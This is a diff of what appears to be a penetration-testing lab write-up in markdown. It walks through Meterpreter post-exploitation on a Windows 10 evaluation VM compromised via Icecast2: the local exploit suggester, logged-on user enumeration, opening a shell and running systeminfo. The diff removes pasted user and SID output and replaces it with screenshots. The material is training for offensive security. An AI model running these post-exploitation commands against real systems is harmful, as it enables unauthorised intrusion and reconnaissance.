@@ -128,44 +128,19 @@ Found 1 result...
 
 8. You can also use Meterpreter's local exploit suggester to find possible exploits.
 
- 
    **Note:** The exploit suggester is just that: a suggestion. Keep in mind that the listed suggestions may not include all available exploits.
 
 meterpreter > run post/multi/recon/local_exploit_suggester
 
-![Meterpreter Download](/Screenshots/Meterpreter-post.PNG "Meterpreter Download")
+![Meterpreter Post](/Screenshots/Meterpreter-post.PNG "Meterpreter Post")
 
 #### Bonus
   
- 
 A. Run a Meterpreter post script that enumerates all logged on users.
 
   > Answer:meterpreter > run post/windows/gather/enum_logged_on_users
 
-[*] Running against session 1
-
-Current Logged Users
-====================
-
- SID                                           User
- ---                                           ----
- S-1-5-21-321011808-3761883066-353627080-1000  MSEDGEWIN10\IEUser
-
-
-[+] Results saved in: /root/.msf4/loot/20220419185306_default_192.168.0.20_host.users.activ_909007.txt
-
-Recently Logged Users
-=====================
-
- SID                                           Profile Path
- ---                                           ------------
- S-1-5-18                                      %systemroot%\system32\config\systemprofile
- S-1-5-19                                      %systemroot%\ServiceProfiles\LocalService
- S-1-5-20                                      %systemroot%\ServiceProfiles\NetworkService
- S-1-5-21-321011808-3761883066-353627080-1000  C:\Users\IEUser
- S-1-5-21-321011808-3761883066-353627080-1003  C:\Users\sysadmin
- S-1-5-21-321011808-3761883066-353627080-1004  C:\Users\vagrant
-
+![Meterpreter Post](/Screenshots/Meterpreter-post2.PNG "Meterpreter Post")
 
 B. Open a Meterpreter shell. 
  
@@ -177,11 +152,10 @@ Microsoft Windows [Version 10.0.17763.1935]
 
 C:\Program Files (x86)\Icecast2 Win32>
 
- 
 C. Run the command that displays the target's computer system information:
 
    > Answer: C:\Program Files (x86)\Icecast2 Win32>systeminfo | more
-systeminfo | more
+
 
 Host Name:                 MSEDGEWIN10
 OS Name:                   Microsoft Windows 10 Enterprise Evaluation
